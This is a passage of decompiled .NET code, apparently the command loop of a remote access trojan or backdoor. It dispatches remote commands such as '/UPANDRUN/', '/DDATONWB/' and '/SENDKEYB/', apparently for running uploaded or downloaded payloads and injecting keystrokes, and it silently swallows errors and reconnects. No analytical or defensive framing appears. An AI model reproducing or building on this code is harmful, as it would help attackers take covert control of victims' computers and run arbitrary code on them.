                new Thread((ParameterizedThreadStart) (a0 => this.UPANDRUN(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                this.Action(false);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/DDATONWB/", false) == 0)
            {
              try
              {
                new Thread((ParameterizedThreadStart) (a0 => this.DDATONWB(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/SENDKEYB/", false) == 0)
            {
              try
              {
                new Thread((ParameterizedThreadStart) (a0 => this.sendkeyb(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/AVAILABL/", false) != 0)
            {
              str2 = (string) null;
              this.Delay(5);
              checked { ++this.restart; }
              if (this.restart == 50)
              {
                try
                {
                  this.Cleanup();
                  goto label_1;
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                  goto label_1;
                }
              }
            }
          }
        }
        catch (Exception ex6)
        {
          ProjectData.SetProjectError(ex6);
          try
          {
            this.Cleanup();
            ProjectData.ClearProjectError();
            goto label_1;
          }
          catch (Exception ex7)
          {
            ProjectData.SetProjectError(ex7);
            ProjectData.ClearProjectError();
            goto label_1;
          }
        }
      }
      try
      {
        this.Cleanup();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  public delegate void CloseWindow_Delegate();
}
